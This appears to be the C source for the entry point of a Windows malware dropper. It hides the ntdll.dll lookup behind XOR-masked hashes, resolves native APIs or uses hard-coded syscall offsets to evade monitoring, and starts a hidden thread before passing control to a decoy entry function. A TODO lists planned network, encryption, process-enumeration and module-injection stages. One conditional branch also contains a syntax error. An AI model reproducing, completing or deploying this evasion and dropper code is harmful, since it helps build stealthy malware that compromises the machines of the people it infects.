#include <config.h>
#include <ldr.h>
#include <ntapi.h>
#include <instance.h>
#include <crypto\crc32.h>
#include <decoy\entry.h>
#include "ntapi\ntapi.h"

enum {
    HASH_NTDLL_KEY    = RTLP_LCG_DWORD,
    HASH_NTDLLALT_KEY = RTLP_LCG_DWORD,
};

static CONST VOLATILE DWORD NtdllStrxsum    = 0xA62A3B3B ^ HASH_NTDLL_KEY;    // ntdll.dll
static CONST VOLATILE DWORD NtdllStrxsumAlt = 0x145370BB ^ HASH_NTDLLALT_KEY; // NTDLL.DLL

static
BOOL
DECLSPEC_DEPRECATED_S("Temporary")
LoadBasicFunctions(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Loading ntapi");

    HMODULE hModule;

    if (IS_NULL(hModule = LdrGetModule(NtdllStrxsum ^ HASH_NTDLL_KEY))) {
        /* For future versions, you never know */
        if (IS_NULL(hModule = LdrGetModule(NtdllStrxsumAlt ^ HASH_NTDLLALT_KEY))) {
            $DLOG1(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");

            return FALSE;
        }
    }

    $DLOG3(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);

#if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
    if (FALSE) {
#elif SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    if (TRUE) {
#else
    if (Config.NtVersion.bIsDeprecated) {
#endif
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            NtapiSyscallsNamesHash[i] ^= NtapiSyscallsNamesHashXorKey;
        }

        ULONG dwFunctionsImported = LdrGetProcAddressEx(
            hModule,
            NtapiSyscallsFunctionsCount,
            NtapiSyscallsNamesHash,
            NtapiSyscallsAddressStorage
            );

        if (dwFunctionsImported != NtapiSyscallsFunctionsCount) {
            $DLOG1(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);
        }
    } else {
        PULONG32_PTR dwSyscallOffset = (PULONG32_PTR)(Config.Cpu.bUnderWow64 ? &NtapiSyscallsOffsetWow64 : &NtapiSyscallsOffsetX86) + (Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount);

        PRAGMA_LOOP_UNROLL_N(16)
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            NtapiSyscallsAddressStorage[i] = (PVOID)dwSyscallOffset[i];
        }
    }

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}

DWORD
WINAPI
IndependetThread()
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD1);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    /*
    TODO:
        ValidateConfig
        AES256
        Winsock
        Process enum
        Module injector
    */

    return 0;
}

ULONG
WINAPI
InitialEntry(VOID)
{
    #ifdef DEBUG
        UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_THREAD0);

        $DLogInitialize(&DebugName, TRUE);
    #endif

    if (!InitConfig()) {
        return 0;
    }

    if(!LoadBasicFunctions()) {
        return 0;
    }

    InitCrc32();

#if SCFG_IGNORE_ISTANCE == ON
    CreateInstance()

    if (TRUE) {
#else
    if (CreateInstance()) {
#endif
        HANDLE hThread;

        if (!NT_ERROR(NtCreateThreadEx(
            &hThread,
            STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
            NULL,
            NtCurrentProcess(),
            IndependetThread,
            (PVOID)RTLP_LCG_NATIVE,
            0,
            0,
            PAGE_SIZE,
            PAGE_SIZE,
            NULL
        ))) {
            $DLOG1(DLG_FLT_DEFAULT, "New thread started!");
        } else {
            $DLOG1(DLG_FLT_CRITICAL, "Failed to create new thread!");
        }
    }

    return DecoyEntry();
}
 